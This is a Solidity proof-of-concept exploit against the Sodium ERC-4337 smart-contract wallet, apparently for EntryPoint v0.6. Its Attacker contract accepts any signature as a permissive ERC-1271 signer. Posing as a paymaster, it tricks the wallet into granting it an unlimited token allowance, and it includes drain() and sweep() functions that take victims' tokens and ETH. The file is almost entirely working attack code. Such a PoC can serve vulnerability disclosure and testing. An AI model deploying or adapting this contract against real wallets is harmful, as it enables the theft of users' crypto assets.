// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// Minimal interfaces for the Sodium ERC-4337 exploit PoC (EntryPoint v0.6).

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

struct UserOperation {
    address sender;
    uint256 nonce;
    bytes initCode;
    bytes callData;
    uint256 callGasLimit;
    uint256 verificationGasLimit;
    uint256 preVerificationGas;
    uint256 maxFeePerGas;
    uint256 maxPriorityFeePerGas;
    bytes paymasterAndData;
    bytes signature;
}

interface IEntryPoint {
    function handleOps(UserOperation[] calldata ops, address payable beneficiary) external;
    function getNonce(address sender, uint192 key) external view returns (uint256);
    function depositTo(address account) external payable;
    function balanceOf(address account) external view returns (uint256);
}

/// @notice The whole attacker: one contract that
///   * is a permissive ERC-1271 signer (accepts any hash/signature),
///   * is the fake "paymaster" whose getTokenAllowanceCast() asks Sodium to grant
///     an unlimited ERC-20 allowance to itself, and
///   * validates as a paymaster so EntryPoint keeps the validation-phase approval.
contract Attacker {
    // ERC-1271 magic value for a recognised signature.
    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return 0x1626ba7e;
    }

    // Sodium._approvePaymasterToken trusts these values and approves `msg.sender`
    // (== this contract) for `suggest` of the token.
    function getTokenAllowanceCast(address) external pure returns (uint256 mini, uint256 suggest) {
        return (1, type(uint256).max);
    }

    // EntryPoint v0.6 paymaster hook: return zero validation data (valid).
    function validatePaymasterUserOp(UserOperation calldata, bytes32, uint256)
        external
        pure
        returns (bytes memory context, uint256 validationData)
    {
        return ("", 0);
    }

    /// Exercise the persistent allowance the account granted us.
    function drain(address token, address from, uint256 amount) external {
        require(IERC20(token).transferFrom(from, address(this), amount), "drain failed");
    }

    function sweep(address to) external {
        (bool ok, ) = to.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }

    receive() external payable {}
}
